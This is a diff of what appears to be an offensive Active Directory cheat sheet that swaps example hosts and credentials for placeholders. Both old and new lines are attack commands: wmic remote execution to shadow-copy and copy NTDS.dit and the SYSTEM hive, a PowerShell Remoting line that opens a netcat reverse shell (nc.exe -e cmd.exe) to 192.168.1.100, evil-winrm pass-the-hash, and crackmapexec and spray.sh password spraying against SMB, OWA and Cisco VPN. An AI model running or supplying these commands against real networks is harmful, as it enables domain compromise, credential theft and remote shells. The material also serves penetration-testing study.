@@ -29,13 +29,8 @@ python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee -just-dc acmebank
 ### Windows Management Instrumentation
 
 ```
-wmic /node:DC_hostname / Domain User / password process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > vss.log“
-wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows NTDS NTDS.dit C: windows temp NTDS.dit 2>&1 > c: vss2.log“
-wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows System32 config SYSTEM C: windows temp SYSTEM.hive 2>&1 > c: vss2.log"
-wmic /node:REMOTE /user:DOMAIN USER /password:PASSWORD process call create “ Windows System32 notepad.exe”
-
-wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"F3rrari" process call create "powershell -enc [...snip...]"
-WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
+wmic /node:"ComputerName" /user:"insomnia.io\john" /password:"1234567@" process call create "powershell -enc <>"
+WMIGrunt wkstn-4945 PowerShell insomnia\john 1234567@
 WMIGrunt wkstn-4945 PowerShell
 
 ```
@@ -59,29 +54,28 @@ PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New
 
 ### PowerShell Remoting 
 ```
-
-Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}
-Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
+Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {hostname}
+Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
 ```
 
 
 ### Evil-WinRM
  
 ```
-proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
+proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
 ```
 
  ### Password Spraying Attack 
 ```
 
-crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt
-smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
-crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH 
-crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions
-spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp
-spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
-spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
-python atomizer.py owa contoso.com 'Fall2018' emails.txt
+crackmapexec smb 192.168.1.1  -d insomnia.io -u john -P /usr/share/wordlists/rockyou.txt
+smbclient -N -L \\\\192.168.1.199 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
+crackmapexec smb 192.168.1.199 -u John -H NTLM Hash 
+crackmapexec smb 192.168.1.99 -u '' -p '' #NULL Sessions
+spray.sh -smb 192.168.1.100 users.txt /usr/share/wordlists/rockyou.txt  1 35 insomnia.io
+spray.sh -owa 192.168.1.100 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
+spray.sh -cisco 192.168.1.100 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
+python atomizer.py owa insomnia.io '123456@' emails.txt
 ```
 ### Runas
 ```
